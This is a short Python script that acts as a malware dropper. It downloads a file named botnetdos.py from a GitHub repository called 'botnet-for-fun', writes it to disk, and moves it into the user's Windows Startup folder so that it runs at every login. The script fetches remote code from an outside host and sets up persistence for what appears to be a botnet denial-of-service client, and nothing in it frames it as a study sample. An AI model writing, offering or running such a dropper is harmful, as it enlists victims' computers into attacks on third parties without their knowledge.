import requests
import shutil
import os

name = os.getlogin()

url = 'https://raw.githubusercontent.com/AtackYT/botnet-for-fun/main/botnetdos.py'
r = requests.get(url, allow_redirects=True)

open('bndos.py', 'wb').write(r.content)

source_path = os.path.abspath('bndos.py')

destination_path = os.path.join('C:', 'Users', name, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

shutil.move(source_path, destination_path)